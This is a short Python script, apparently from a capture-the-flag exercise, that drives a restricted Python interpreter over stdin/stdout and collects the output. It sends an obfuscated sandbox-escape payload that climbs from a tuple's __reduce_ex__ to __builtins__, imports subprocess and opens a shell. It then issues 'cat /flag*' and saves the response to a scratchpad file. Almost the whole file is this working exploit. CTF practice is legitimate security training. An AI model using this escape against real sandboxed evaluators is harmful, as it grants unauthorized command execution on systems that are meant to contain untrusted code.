import os,sys,time,select
OUT="/private/tmp/claude-502/-Users-makoto-sugita-personal-METIS/d898862a-22fc-4326-ad27-cc093443114d/scratchpad/dec_recv.txt"
L1=b"().__reduce_ex__(-~(()==()))[()>()].__builtins__['x__import__'[()==():]]('subprocess').run(['sh'])"
def send(b):
    os.write(1,b); 
time.sleep(0.6)
send(L1+b"\n")
time.sleep(1.8)
send(b"cat /flag*\n")
time.sleep(1.0)
send(b"exit\n")
buf=b""; end=time.time()+4
while time.time()<end:
    r,_,_=select.select([0],[],[],0.3)
    if r:
        d=os.read(0,65536)
        if not d: break
        buf+=d
open(OUT,"wb").write(buf)
sys.stderr.write("RECV_LEN %d\n"%len(buf))
